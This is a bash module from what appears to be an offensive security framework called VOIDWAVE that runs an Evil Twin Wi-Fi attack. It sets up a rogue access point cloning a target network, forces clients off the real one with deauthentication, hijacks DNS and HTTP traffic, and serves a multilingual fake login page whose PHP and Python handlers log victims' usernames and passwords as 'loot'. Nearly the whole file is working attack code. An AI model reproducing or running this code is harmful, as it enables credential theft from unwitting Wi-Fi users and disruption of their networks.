#!/usr/bin/env bash
# ═══════════════════════════════════════════════════════════════════════════════
# VOIDWAVE - Offensive Security Framework
# ═══════════════════════════════════════════════════════════════════════════════
# Copyright (c) 2025 Nerds489
# SPDX-License-Identifier: Apache-2.0
#
# Evil Twin: Rogue AP attacks with captive portal credential harvesting
# ═══════════════════════════════════════════════════════════════════════════════

# Prevent multiple sourcing
[[ -n "${_VOIDWAVE_EVILTWIN_LOADED:-}" ]] && return 0
readonly _VOIDWAVE_EVILTWIN_LOADED=1

# Source dependencies
if ! declare -F log_info &>/dev/null; then
    source "${BASH_SOURCE%/*}/../core.sh"
fi

# Source DOS module for deauth
[[ -f "${BASH_SOURCE%/*}/dos.sh" ]] && source "${BASH_SOURCE%/*}/dos.sh"
[[ -f "${BASH_SOURCE%/*}/../wireless/loot.sh" ]] && source "${BASH_SOURCE%/*}/../wireless/loot.sh"

#═══════════════════════════════════════════════════════════════════════════════
# EVIL TWIN CONFIGURATION
#═══════════════════════════════════════════════════════════════════════════════

# Default settings
declare -g ET_AP_INTERFACE="${ET_AP_INTERFACE:-}"
declare -g ET_DEAUTH_INTERFACE="${ET_DEAUTH_INTERFACE:-}"
declare -g ET_IP_RANGE="${ET_IP_RANGE:-192.168.1}"
declare -g ET_GATEWAY="${ET_GATEWAY:-192.168.1.1}"
declare -g ET_NETMASK="${ET_NETMASK:-255.255.255.0}"
declare -g ET_DHCP_RANGE="${ET_DHCP_RANGE:-192.168.1.100,192.168.1.250}"
declare -g ET_DNS="${ET_DNS:-8.8.8.8}"
declare -g ET_PORTAL_PORT="${ET_PORTAL_PORT:-80}"
declare -g ET_SSL_PORT="${ET_SSL_PORT:-443}"

# Working directories
declare -g ET_WORK_DIR="/tmp/eviltwin_$$"
declare -g ET_HOSTAPD_CONF="${ET_WORK_DIR}/hostapd.conf"
declare -g ET_DNSMASQ_CONF="${ET_WORK_DIR}/dnsmasq.conf"
declare -g ET_PORTAL_DIR="${ET_WORK_DIR}/portal"
declare -g ET_CREDS_FILE="${ET_WORK_DIR}/credentials.txt"

# Process tracking
declare -g _ET_HOSTAPD_PID=""
declare -g _ET_DNSMASQ_PID=""
declare -g _ET_WEBSERVER_PID=""
declare -g _ET_DEAUTH_PID=""

# Supported languages for captive portals
declare -ga ET_LANGUAGES=("en" "es" "fr" "de" "it" "pt" "ru" "zh" "ja" "ko" "ar" "nl" "pl")

#═══════════════════════════════════════════════════════════════════════════════
# HOSTAPD MANAGEMENT
#═══════════════════════════════════════════════════════════════════════════════

# Generate hostapd configuration
# Args: $1 = interface, $2 = SSID, $3 = channel, $4 = security (open/wpa), $5 = password (for wpa)
et_generate_hostapd_conf() {
    local iface="$1"
    local ssid="$2"
    local channel="$3"
    local security="${4:-open}"
    local password="${5:-}"

    mkdir -p "$ET_WORK_DIR"

    cat > "$ET_HOSTAPD_CONF" << EOF
interface=$iface
driver=nl80211
ssid=$ssid
hw_mode=g
channel=$channel
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
EOF

    if [[ "$security" == "wpa" && -n "$password" ]]; then
        cat >> "$ET_HOSTAPD_CONF" << EOF
wpa=2
wpa_passphrase=$password
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
rsn_pairwise=CCMP
EOF
    fi

    # Add 802.11n support if available
    cat >> "$ET_HOSTAPD_CONF" << EOF
wmm_enabled=1
ieee80211n=1
EOF

    log_debug "Generated hostapd config: $ET_HOSTAPD_CONF"
}

# Start hostapd
# Args: $1 = interface, $2 = SSID, $3 = channel, $4 = security, $5 = password
et_start_hostapd() {
    local iface="$1"
    local ssid="$2"
    local channel="$3"
    local security="${4:-open}"
    local password="${5:-}"

    if ! command -v hostapd &>/dev/null; then
        log_error "hostapd not found"
        return 1
    fi

    # Kill any existing hostapd
    et_stop_hostapd

    # Generate config
    et_generate_hostapd_conf "$iface" "$ssid" "$channel" "$security" "$password"

    # Bring interface down and configure
    ip link set "$iface" down 2>/dev/null
    ip addr flush dev "$iface" 2>/dev/null
    ip link set "$iface" up 2>/dev/null
    ip addr add "${ET_GATEWAY}/24" dev "$iface" 2>/dev/null

    log_info "Starting hostapd for SSID: $ssid"

    hostapd "$ET_HOSTAPD_CONF" &>/dev/null &
    _ET_HOSTAPD_PID=$!

    sleep 2

    if kill -0 "$_ET_HOSTAPD_PID" 2>/dev/null; then
        log_success "hostapd started (PID: $_ET_HOSTAPD_PID)"
        return 0
    else
        log_error "hostapd failed to start"
        return 1
    fi
}

# Stop hostapd
et_stop_hostapd() {
    if [[ -n "$_ET_HOSTAPD_PID" ]]; then
        kill "$_ET_HOSTAPD_PID" 2>/dev/null
        wait "$_ET_HOSTAPD_PID" 2>/dev/null
        _ET_HOSTAPD_PID=""
    fi

    pkill -f "hostapd.*$ET_HOSTAPD_CONF" 2>/dev/null
}

#═══════════════════════════════════════════════════════════════════════════════
# DNSMASQ MANAGEMENT
#═══════════════════════════════════════════════════════════════════════════════

# Generate dnsmasq configuration
# Args: $1 = interface
et_generate_dnsmasq_conf() {
    local iface="$1"

    mkdir -p "$ET_WORK_DIR"

    cat > "$ET_DNSMASQ_CONF" << EOF
interface=$iface
dhcp-range=${ET_DHCP_RANGE},12h
dhcp-option=3,${ET_GATEWAY}
dhcp-option=6,${ET_GATEWAY}
server=${ET_DNS}
log-queries
log-dhcp
listen-address=127.0.0.1
listen-address=${ET_GATEWAY}
address=/#/${ET_GATEWAY}
EOF

    log_debug "Generated dnsmasq config: $ET_DNSMASQ_CONF"
}

# Start dnsmasq
# Args: $1 = interface
et_start_dnsmasq() {
    local iface="$1"

    if ! command -v dnsmasq &>/dev/null; then
        log_error "dnsmasq not found"
        return 1
    fi

    et_stop_dnsmasq
    et_generate_dnsmasq_conf "$iface"

    log_info "Starting dnsmasq DHCP/DNS server"

    dnsmasq -C "$ET_DNSMASQ_CONF" --no-daemon &>/dev/null &
    _ET_DNSMASQ_PID=$!

    sleep 1

    if kill -0 "$_ET_DNSMASQ_PID" 2>/dev/null; then
        log_success "dnsmasq started (PID: $_ET_DNSMASQ_PID)"
        return 0
    else
        log_error "dnsmasq failed to start"
        return 1
    fi
}

# Stop dnsmasq
et_stop_dnsmasq() {
    if [[ -n "$_ET_DNSMASQ_PID" ]]; then
        kill "$_ET_DNSMASQ_PID" 2>/dev/null
        wait "$_ET_DNSMASQ_PID" 2>/dev/null
        _ET_DNSMASQ_PID=""
    fi

    pkill -f "dnsmasq.*$ET_DNSMASQ_CONF" 2>/dev/null
}

#═══════════════════════════════════════════════════════════════════════════════
# CAPTIVE PORTAL
#═══════════════════════════════════════════════════════════════════════════════

# Generate captive portal HTML
# Args: $1 = target SSID, $2 = language (default: en), $3 = template (default: generic)
et_generate_portal() {
    local ssid="$1"
    local lang="${2:-en}"
    local template="${3:-generic}"

    mkdir -p "$ET_PORTAL_DIR"

    # Language strings
    declare -A LANG_TITLE LANG_MSG LANG_USER LANG_PASS LANG_SUBMIT LANG_ERROR

    LANG_TITLE=([en]="WiFi Authentication Required" [es]="Autenticación WiFi Requerida" [fr]="Authentification WiFi Requise" [de]="WLAN-Authentifizierung Erforderlich" [it]="Autenticazione WiFi Richiesta" [pt]="Autenticação WiFi Necessária" [ru]="Требуется аутентификация WiFi" [zh]="需要WiFi认证" [ja]="WiFi認証が必要です" [ko]="WiFi 인증 필요" [ar]="مطلوب مصادقة WiFi" [nl]="WiFi-authenticatie Vereist" [pl]="Wymagane Uwierzytelnianie WiFi")

    LANG_MSG=([en]="Please enter your credentials to access the internet" [es]="Por favor ingrese sus credenciales para acceder a internet" [fr]="Veuillez entrer vos identifiants pour accéder à Internet" [de]="Bitte geben Sie Ihre Anmeldedaten ein, um auf das Internet zuzugreifen" [it]="Inserisci le tue credenziali per accedere a Internet" [pt]="Digite suas credenciais para acessar a internet" [ru]="Пожалуйста, введите ваши данные для доступа в Интернет" [zh]="请输入您的凭证以访问互联网" [ja]="インターネットにアクセスするには認証情報を入力してください" [ko]="인터넷에 접속하려면 자격 증명을 입력하세요" [ar]="الرجاء إدخال بيانات الاعتماد الخاصة بك للوصول إلى الإنترنت" [nl]="Voer uw inloggegevens in om toegang te krijgen tot internet" [pl]="Wprowadź dane logowania, aby uzyskać dostęp do Internetu")

    LANG_USER=([en]="Email or Username" [es]="Correo o Usuario" [fr]="Email ou Nom d'utilisateur" [de]="E-Mail oder Benutzername" [it]="Email o Nome utente" [pt]="Email ou Nome de usuário" [ru]="Email или Имя пользователя" [zh]="电子邮件或用户名" [ja]="メールまたはユーザー名" [ko]="이메일 또는 사용자 이름" [ar]="البريد الإلكتروني أو اسم المستخدم" [nl]="E-mail of Gebruikersnaam" [pl]="Email lub Nazwa użytkownika")

    LANG_PASS=([en]="WiFi Password" [es]="Contraseña WiFi" [fr]="Mot de passe WiFi" [de]="WLAN-Passwort" [it]="Password WiFi" [pt]="Senha WiFi" [ru]="Пароль WiFi" [zh]="WiFi密码" [ja]="WiFiパスワード" [ko]="WiFi 비밀번호" [ar]="كلمة مرور WiFi" [nl]="WiFi-wachtwoord" [pl]="Hasło WiFi")

    LANG_SUBMIT=([en]="Connect" [es]="Conectar" [fr]="Connexion" [de]="Verbinden" [it]="Connetti" [pt]="Conectar" [ru]="Подключиться" [zh]="连接" [ja]="接続" [ko]="연결" [ar]="اتصال" [nl]="Verbinden" [pl]="Połącz")

    LANG_ERROR=([en]="Invalid credentials. Please try again." [es]="Credenciales inválidas. Por favor intente de nuevo." [fr]="Identifiants invalides. Veuillez réessayer." [de]="Ungültige Anmeldedaten. Bitte versuchen Sie es erneut." [it]="Credenziali non valide. Per favore riprova." [pt]="Credenciais inválidas. Por favor, tente novamente." [ru]="Неверные учетные данные. Пожалуйста, попробуйте снова." [zh]="凭证无效。请重试。" [ja]="認証情報が無効です。もう一度お試しください。" [ko]="자격 증명이 잘못되었습니다. 다시 시도하세요." [ar]="بيانات الاعتماد غير صالحة. يرجى المحاولة مرة أخرى." [nl]="Ongeldige inloggegevens. Probeer het opnieuw." [pl]="Nieprawidłowe dane. Proszę spróbować ponownie.")

    # Get strings for selected language (fallback to English)
    local title="${LANG_TITLE[$lang]:-${LANG_TITLE[en]}}"
    local msg="${LANG_MSG[$lang]:-${LANG_MSG[en]}}"
    local user="${LANG_USER[$lang]:-${LANG_USER[en]}}"
    local pass="${LANG_PASS[$lang]:-${LANG_PASS[en]}}"
    local submit="${LANG_SUBMIT[$lang]:-${LANG_SUBMIT[en]}}"

    # Generate portal HTML
    cat > "$ET_PORTAL_DIR/index.html" << EOF
<!DOCTYPE html>
<html lang="$lang">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>$ssid - $title</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 16px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            padding: 40px;
            max-width: 400px;
            width: 100%;
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo svg {
            width: 60px;
            height: 60px;
            fill: #667eea;
        }
        h1 {
            color: #333;
            font-size: 24px;
            text-align: center;
            margin-bottom: 10px;
        }
        .ssid {
            color: #667eea;
            font-weight: 600;
            text-align: center;
            margin-bottom: 20px;
        }
        p {
            color: #666;
            text-align: center;
            margin-bottom: 30px;
            line-height: 1.5;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            color: #555;
            margin-bottom: 8px;
            font-weight: 500;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 14px;
            border: 2px solid #e1e1e1;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        input:focus {
            outline: none;
            border-color: #667eea;
        }
        button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
        }
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(102, 126, 234, 0.4);
        }
        .error {
            background: #ffe6e6;
            color: #cc0000;
            padding: 12px;
            border-radius: 8px;
            text-align: center;
            margin-bottom: 20px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 24 24"><path d="M12,21L15.6,16.2C14.6,15.45 13.35,15 12,15C10.65,15 9.4,15.45 8.4,16.2L12,21M12,3C7.95,3 4.21,4.34 1.2,6.6L3,9C5.5,7.12 8.62,6 12,6C15.38,6 18.5,7.12 21,9L22.8,6.6C19.79,4.34 16.05,3 12,3M12,9C9.3,9 6.81,9.89 4.8,11.4L6.6,13.8C8.1,12.67 9.97,12 12,12C14.03,12 15.9,12.67 17.4,13.8L19.2,11.4C17.19,9.89 14.7,9 12,9Z"/></svg>
        </div>
        <h1>$title</h1>
        <div class="ssid">$ssid</div>
        <p>$msg</p>
        <div class="error" id="error"></div>
        <form action="/capture" method="POST">
            <div class="form-group">
                <label for="username">$user</label>
                <input type="text" id="username" name="username" required autocomplete="off">
            </div>
            <div class="form-group">
                <label for="password">$pass</label>
                <input type="password" id="password" name="password" required>
            </div>
            <input type="hidden" name="ssid" value="$ssid">
            <button type="submit">$submit</button>
        </form>
    </div>
</body>
</html>
EOF

    # Generate success page
    cat > "$ET_PORTAL_DIR/success.html" << EOF
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta http-equiv="refresh" content="3;url=http://www.google.com">
    <title>Connected</title>
    <style>
        body { font-family: sans-serif; text-align: center; padding: 50px; }
        .success { color: #28a745; font-size: 48px; }
    </style>
</head>
<body>
    <div class="success">✓</div>
    <h1>Connected Successfully</h1>
    <p>Redirecting...</p>
</body>
</html>
EOF

    log_debug "Generated captive portal in $ET_PORTAL_DIR"
}

# Simple PHP credential capture script
et_generate_capture_script() {
    cat > "$ET_PORTAL_DIR/capture.php" << 'EOF'
<?php
$creds_file = '/tmp/eviltwin_*/credentials.txt';
$files = glob($creds_file);
if (!empty($files)) {
    $creds_file = $files[0];
}

$timestamp = date('Y-m-d H:i:s');
$ip = $_SERVER['REMOTE_ADDR'];
$username = isset($_POST['username']) ? $_POST['username'] : '';
$password = isset($_POST['password']) ? $_POST['password'] : '';
$ssid = isset($_POST['ssid']) ? $_POST['ssid'] : '';

$log = "[$timestamp] IP:$ip SSID:$ssid USER:$username PASS:$password\n";
file_put_contents($creds_file, $log, FILE_APPEND);

header('Location: /success.html');
exit;
?>
EOF
}

#═══════════════════════════════════════════════════════════════════════════════
# WEB SERVER
#═══════════════════════════════════════════════════════════════════════════════

# Start simple web server for captive portal
# Args: $1 = port (default 80)
et_start_webserver() {
    local port="${1:-$ET_PORTAL_PORT}"

    et_stop_webserver

    # Try PHP built-in server first
    if command -v php &>/dev/null; then
        log_info "Starting PHP web server on port $port"
        et_generate_capture_script

        php -S "0.0.0.0:$port" -t "$ET_PORTAL_DIR" &>/dev/null &
        _ET_WEBSERVER_PID=$!

    # Fall back to Python
    elif command -v python3 &>/dev/null; then
        log_info "Starting Python web server on port $port"

        # Create Python capture handler
        cat > "$ET_PORTAL_DIR/server.py" << 'PYEOF'
import http.server
import socketserver
import urllib.parse
import os
from datetime import datetime

class CaptureHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/capture':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            params = urllib.parse.parse_qs(post_data)

            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            ip = self.client_address[0]
            username = params.get('username', [''])[0]
            password = params.get('password', [''])[0]
            ssid = params.get('ssid', [''])[0]

            creds_file = os.environ.get('CREDS_FILE', '/tmp/credentials.txt')
            with open(creds_file, 'a') as f:
                f.write(f"[{timestamp}] IP:{ip} SSID:{ssid} USER:{username} PASS:{password}\n")

            self.send_response(302)
            self.send_header('Location', '/success.html')
            self.end_headers()
        else:
            self.send_error(404)

PORT = int(os.environ.get('PORT', 80))
os.chdir(os.environ.get('PORTAL_DIR', '.'))
with socketserver.TCPServer(("", PORT), CaptureHandler) as httpd:
    httpd.serve_forever()
PYEOF

        PORT="$port" PORTAL_DIR="$ET_PORTAL_DIR" CREDS_FILE="$ET_CREDS_FILE" \
            python3 "$ET_PORTAL_DIR/server.py" &>/dev/null &
        _ET_WEBSERVER_PID=$!

    else
        log_error "No web server available (need php or python3)"
        return 1
    fi

    sleep 1

    if kill -0 "$_ET_WEBSERVER_PID" 2>/dev/null; then
        log_success "Web server started (PID: $_ET_WEBSERVER_PID)"
        return 0
    else
        log_error "Web server failed to start"
        return 1
    fi
}

# Stop web server
et_stop_webserver() {
    if [[ -n "$_ET_WEBSERVER_PID" ]]; then
        kill "$_ET_WEBSERVER_PID" 2>/dev/null
        wait "$_ET_WEBSERVER_PID" 2>/dev/null
        _ET_WEBSERVER_PID=""
    fi

    # Kill any remaining on portal port
    fuser -k "${ET_PORTAL_PORT}/tcp" 2>/dev/null
}

#═══════════════════════════════════════════════════════════════════════════════
# IPTABLES RULES
#═══════════════════════════════════════════════════════════════════════════════

# Setup iptables for captive portal
# Args: $1 = interface
et_setup_iptables() {
    local iface="$1"

    # Flush existing rules for this interface
    iptables -t nat -F 2>/dev/null
    iptables -F 2>/dev/null

    # Enable IP forwarding
    echo 1 > /proc/sys/net/ipv4/ip_forward

    # Redirect all HTTP to captive portal
    iptables -t nat -A PREROUTING -i "$iface" -p tcp --dport 80 -j DNAT --to-destination "${ET_GATEWAY}:${ET_PORTAL_PORT}"
    iptables -t nat -A PREROUTING -i "$iface" -p tcp --dport 443 -j DNAT --to-destination "${ET_GATEWAY}:${ET_PORTAL_PORT}"

    # Allow established connections
    iptables -A FORWARD -i "$iface" -o "$iface" -m state --state ESTABLISHED,RELATED -j ACCEPT

    # Allow DNS
    iptables -t nat -A PREROUTING -i "$iface" -p udp --dport 53 -j DNAT --to-destination "${ET_GATEWAY}:53"

    log_debug "iptables rules configured for captive portal"
}

# Clear iptables rules
et_clear_iptables() {
    iptables -t nat -F 2>/dev/null
    iptables -F 2>/dev/null
    echo 0 > /proc/sys/net/ipv4/ip_forward
}

#═══════════════════════════════════════════════════════════════════════════════
# EVIL TWIN ATTACKS
#═══════════════════════════════════════════════════════════════════════════════

# Full Evil Twin attack
# Args: $1 = AP interface, $2 = deauth interface (optional), $3 = target SSID,
#       $4 = target BSSID, $5 = channel, $6 = language
et_attack_full() {
    local ap_iface="$1"
    local deauth_iface="${2:-}"
    local ssid="$3"
    local bssid="$4"
    local channel="$5"
    local lang="${6:-en}"

    log_info "Starting Evil Twin attack on ${C_WHITE}$ssid${C_RESET}"
    log_info "Target AP: $bssid (Channel $channel)"

    # Stop any existing attack
    et_stop_all

    # Create work directory
    mkdir -p "$ET_WORK_DIR"

    # Generate captive portal
    et_generate_portal "$ssid" "$lang"

    # Start hostapd
    if ! et_start_hostapd "$ap_iface" "$ssid" "$channel"; then
        log_error "Failed to start hostapd"
        return 1
    fi

    # Start dnsmasq
    if ! et_start_dnsmasq "$ap_iface"; then
        log_error "Failed to start dnsmasq"
        et_stop_hostapd
        return 1
    fi

    # Setup iptables
    et_setup_iptables "$ap_iface"

    # Start web server
    if ! et_start_webserver; then
        log_error "Failed to start web server"
        et_stop_all
        return 1
    fi

    # Start deauth if second interface provided
    if [[ -n "$deauth_iface" ]]; then
        log_info "Starting deauth on $deauth_iface"

        if declare -F dos_deauth &>/dev/null; then
            iwconfig "$deauth_iface" channel "$channel" 2>/dev/null
            dos_deauth "$deauth_iface" "$bssid"
        fi
    fi

    log_success "Evil Twin attack running!"
    log_info "Credentials will be saved to: $ET_CREDS_FILE"

    return 0
}

# Simple Evil Twin (open AP, no portal)
# Args: $1 = interface, $2 = SSID, $3 = channel
et_attack_simple() {
    local iface="$1"
    local ssid="$2"
    local channel="$3"

    log_info "Starting simple Evil Twin (open AP)"

    mkdir -p "$ET_WORK_DIR"

    if ! et_start_hostapd "$iface" "$ssid" "$channel" "open"; then
        return 1
    fi

    if ! et_start_dnsmasq "$iface"; then
        et_stop_hostapd
        return 1
    fi

    # Enable routing for internet access
    echo 1 > /proc/sys/net/ipv4/ip_forward
    iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

    log_success "Simple Evil Twin running - SSID: $ssid"
    return 0
}

# Evil Twin with WPA (honeypot with known password)
# Args: $1 = interface, $2 = SSID, $3 = channel, $4 = password
et_attack_wpa() {
    local iface="$1"
    local ssid="$2"
    local channel="$3"
    local password="$4"

    log_info "Starting WPA Evil Twin"

    mkdir -p "$ET_WORK_DIR"

    if ! et_start_hostapd "$iface" "$ssid" "$channel" "wpa" "$password"; then
        return 1
    fi

    if ! et_start_dnsmasq "$iface"; then
        et_stop_hostapd
        return 1
    fi

    # Enable routing
    echo 1 > /proc/sys/net/ipv4/ip_forward
    iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

    log_success "WPA Evil Twin running - SSID: $ssid, Password: $password"
    return 0
}

#═══════════════════════════════════════════════════════════════════════════════
# CREDENTIAL MONITORING
#═══════════════════════════════════════════════════════════════════════════════

# Watch for captured credentials
et_watch_credentials() {
    if [[ ! -f "$ET_CREDS_FILE" ]]; then
        touch "$ET_CREDS_FILE"
    fi

    log_info "Watching for credentials..."
    tail -f "$ET_CREDS_FILE" 2>/dev/null | while read -r line; do
        if [[ -n "$line" ]]; then
            log_success "CAPTURED: $line"

            # Save to loot if available
            if declare -F wireless_loot_add_credential &>/dev/null; then
                # Parse credential
                local ssid user pass
                ssid=$(echo "$line" | sed -n 's/.*SSID:\([^ ]*\).*/\1/p')
                user=$(echo "$line" | sed -n 's/.*USER:\([^ ]*\).*/\1/p')
                pass=$(echo "$line" | sed -n 's/.*PASS:\(.*\)/\1/p')

                wireless_loot_add_credential "" "$ssid" "$pass" "eviltwin" "user=$user"
            fi
        fi
    done
}

# Get captured credentials
et_get_credentials() {
    if [[ -f "$ET_CREDS_FILE" ]]; then
        cat "$ET_CREDS_FILE"
    else
        echo "No credentials captured yet"
    fi
}

# Count captured credentials
et_count_credentials() {
    if [[ -f "$ET_CREDS_FILE" ]]; then
        wc -l < "$ET_CREDS_FILE"
    else
        echo "0"
    fi
}

#═══════════════════════════════════════════════════════════════════════════════
# STATUS AND CONTROL
#═══════════════════════════════════════════════════════════════════════════════

# Get attack status
et_status() {
    echo ""
    echo -e "    ${C_CYAN}Evil Twin Status${C_RESET}"
    echo -e "    ${C_SHADOW}$(printf '─%.0s' {1..40})${C_RESET}"

    # Check hostapd
    if [[ -n "$_ET_HOSTAPD_PID" ]] && kill -0 "$_ET_HOSTAPD_PID" 2>/dev/null; then
        echo -e "    hostapd:    ${C_GREEN}Running${C_RESET} (PID: $_ET_HOSTAPD_PID)"
    else
        echo -e "    hostapd:    ${C_RED}Stopped${C_RESET}"
    fi

    # Check dnsmasq
    if [[ -n "$_ET_DNSMASQ_PID" ]] && kill -0 "$_ET_DNSMASQ_PID" 2>/dev/null; then
        echo -e "    dnsmasq:    ${C_GREEN}Running${C_RESET} (PID: $_ET_DNSMASQ_PID)"
    else
        echo -e "    dnsmasq:    ${C_RED}Stopped${C_RESET}"
    fi

    # Check web server
    if [[ -n "$_ET_WEBSERVER_PID" ]] && kill -0 "$_ET_WEBSERVER_PID" 2>/dev/null; then
        echo -e "    WebServer:  ${C_GREEN}Running${C_RESET} (PID: $_ET_WEBSERVER_PID)"
    else
        echo -e "    WebServer:  ${C_RED}Stopped${C_RESET}"
    fi

    # Credentials
    local creds_count
    creds_count=$(et_count_credentials)
    echo -e "    Credentials: ${C_WHITE}$creds_count${C_RESET} captured"

    echo ""
}

# Stop all Evil Twin components
et_stop_all() {
    log_info "Stopping Evil Twin attack..."

    et_stop_webserver
    et_stop_dnsmasq
    et_stop_hostapd
    et_clear_iptables

    # Stop deauth if running
    if declare -F dos_stop &>/dev/null; then
        dos_stop
    fi

    log_success "Evil Twin stopped"
}

#═══════════════════════════════════════════════════════════════════════════════
# CLEANUP
#═══════════════════════════════════════════════════════════════════════════════

# Cleanup function
et_cleanup() {
    et_stop_all

    # Save credentials to loot before cleanup
    if [[ -f "$ET_CREDS_FILE" ]] && [[ -s "$ET_CREDS_FILE" ]]; then
        local loot_dir="${WIRELESS_LOOT_PORTALS:-$HOME/.voidwave/loot/wireless/portals}"
        mkdir -p "$loot_dir"
        cp "$ET_CREDS_FILE" "$loot_dir/credentials_$(date +%Y%m%d_%H%M%S).txt"
    fi

    # Clean work directory
    rm -rf "$ET_WORK_DIR" 2>/dev/null
}

# Register cleanup (uses cleanup registry to prevent trap overwriting)
register_cleanup et_cleanup

#═══════════════════════════════════════════════════════════════════════════════
# EXPORTS
#═══════════════════════════════════════════════════════════════════════════════

export -f et_generate_hostapd_conf et_start_hostapd et_stop_hostapd
export -f et_generate_dnsmasq_conf et_start_dnsmasq et_stop_dnsmasq
export -f et_generate_portal et_start_webserver et_stop_webserver
export -f et_setup_iptables et_clear_iptables
export -f et_attack_full et_attack_simple et_attack_wpa
export -f et_watch_credentials et_get_credentials et_count_credentials
export -f et_status et_stop_all et_cleanup
